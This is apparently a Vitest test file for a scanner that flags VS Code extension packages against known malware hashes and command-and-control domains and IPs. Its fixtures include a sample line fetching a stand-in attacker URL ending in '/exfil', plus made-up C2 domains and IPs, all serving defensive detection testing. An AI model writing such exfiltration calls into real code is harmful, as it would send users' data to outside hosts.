import { describe, expect, it } from "vitest";
import type { VsixContents, VsixManifest, ZooData } from "../types.js";
import { checkDomains, checkHashes, checkIocs, checkIps } from "./ioc.js";

function makeContents(files: Record<string, string>): VsixContents {
  const manifest: VsixManifest = {
    name: "test",
    publisher: "test",
    version: "1.0.0",
  };
  const fileMap = new Map<string, Buffer>();
  fileMap.set("package.json", Buffer.from(JSON.stringify(manifest)));
  for (const [name, content] of Object.entries(files)) {
    fileMap.set(name, Buffer.from(content));
  }
  return {
    manifest,
    files: fileMap,
    basePath: "/test",
  };
}

function makeZooData(overrides: Partial<ZooData> = {}): ZooData {
  return {
    blocklist: [],
    hashes: new Set(),
    domains: new Set(),
    ips: new Set(),
    maliciousNpmPackages: new Set(),
    ...overrides,
  };
}

describe("checkHashes", () => {
  it("detects known malware hash", () => {
    const contents = makeContents({ "malware.js": "malicious code" });
    // Get hash of the malware.js file content
    const malwareHash = "69d58c3edfcb35a3b17e38b0ed3c86e8a5f5e5d0c7e9b8d7b4a3b2c1d0e9f8a7";
    const knownHashes = new Set([malwareHash]);

    // Compute the actual hash of "malicious code"
    const crypto = require("node:crypto");
    const actualHash = crypto.createHash("sha256").update("malicious code").digest("hex");
    knownHashes.add(actualHash);

    const findings = checkHashes(contents, knownHashes);
    expect(findings.some((f) => f.id === "KNOWN_MALWARE_HASH")).toBe(true);
    expect(findings[0]?.severity).toBe("critical");
  });

  it("does not flag unknown files", () => {
    const contents = makeContents({ "clean.js": "clean code" });
    const knownHashes = new Set(["0000000000000000000000000000000000000000000000000000000000000000"]);

    const findings = checkHashes(contents, knownHashes);
    expect(findings).toHaveLength(0);
  });
});

describe("checkDomains", () => {
  it("detects known C2 domain in JS file", () => {
    const contents = makeContents({
      "extension.js": 'fetch("https://evil-c2.example.com/exfil")',
    });
    const knownDomains = new Set(["evil-c2.example.com"]);

    const findings = checkDomains(contents, knownDomains);
    expect(findings.some((f) => f.id === "KNOWN_C2_DOMAIN")).toBe(true);
    expect(findings[0]?.severity).toBe("critical");
    expect(findings[0]?.metadata?.["domain"]).toBe("evil-c2.example.com");
  });

  it("detects domain in JSON file", () => {
    const contents = makeContents({
      "config.json": '{"url": "https://malware.badsite.net/api"}',
    });
    const knownDomains = new Set(["malware.badsite.net"]);

    const findings = checkDomains(contents, knownDomains);
    expect(findings.some((f) => f.id === "KNOWN_C2_DOMAIN")).toBe(true);
  });

  it("skips non-scannable files", () => {
    const contents = makeContents({
      "image.png": "evil-c2.example.com",
    });
    const knownDomains = new Set(["evil-c2.example.com"]);

    const findings = checkDomains(contents, knownDomains);
    expect(findings).toHaveLength(0);
  });

  it("does not flag unknown domains", () => {
    const contents = makeContents({
      "extension.js": 'fetch("https://api.github.com/repos")',
    });
    const knownDomains = new Set(["evil-c2.example.com"]);

    const findings = checkDomains(contents, knownDomains);
    expect(findings).toHaveLength(0);
  });
});

describe("checkIps", () => {
  it("detects known C2 IP address", () => {
    const contents = makeContents({
      "extension.js": 'const server = "185.234.123.45:8080";',
    });
    const knownIps = new Set(["185.234.123.45"]);

    const findings = checkIps(contents, knownIps);
    expect(findings.some((f) => f.id === "KNOWN_C2_IP")).toBe(true);
    expect(findings[0]?.severity).toBe("critical");
    expect(findings[0]?.metadata?.["ip"]).toBe("185.234.123.45");
  });

  it("ignores private/localhost IPs", () => {
    const contents = makeContents({
      "extension.js": 'const local = "127.0.0.1"; const private = "192.168.1.1";',
    });
    const knownIps = new Set(["127.0.0.1", "192.168.1.1"]);

    const findings = checkIps(contents, knownIps);
    // These should be filtered out by isValidIp
    expect(findings).toHaveLength(0);
  });

  it("does not flag unknown IPs", () => {
    const contents = makeContents({
      "extension.js": 'const api = "8.8.8.8";',
    });
    const knownIps = new Set(["185.234.123.45"]);

    const findings = checkIps(contents, knownIps);
    expect(findings).toHaveLength(0);
  });
});

describe("checkIocs", () => {
  it("combines all IOC checks", () => {
    const contents = makeContents({
      "extension.js": 'fetch("https://evil.example.com"); const ip = "185.234.123.45";',
    });
    const zooData = makeZooData({
      domains: new Set(["evil.example.com"]),
      ips: new Set(["185.234.123.45"]),
    });

    const findings = checkIocs(contents, zooData);
    expect(findings.some((f) => f.id === "KNOWN_C2_DOMAIN")).toBe(true);
    expect(findings.some((f) => f.id === "KNOWN_C2_IP")).toBe(true);
  });

  it("returns empty for clean extension", () => {
    const contents = makeContents({
      "extension.js": 'console.log("hello world");',
    });
    const zooData = makeZooData({
      domains: new Set(["evil.example.com"]),
      ips: new Set(["185.234.123.45"]),
      hashes: new Set(["0000000000000000000000000000000000000000000000000000000000000000"]),
    });

    const findings = checkIocs(contents, zooData);
    expect(findings).toHaveLength(0);
  });
});
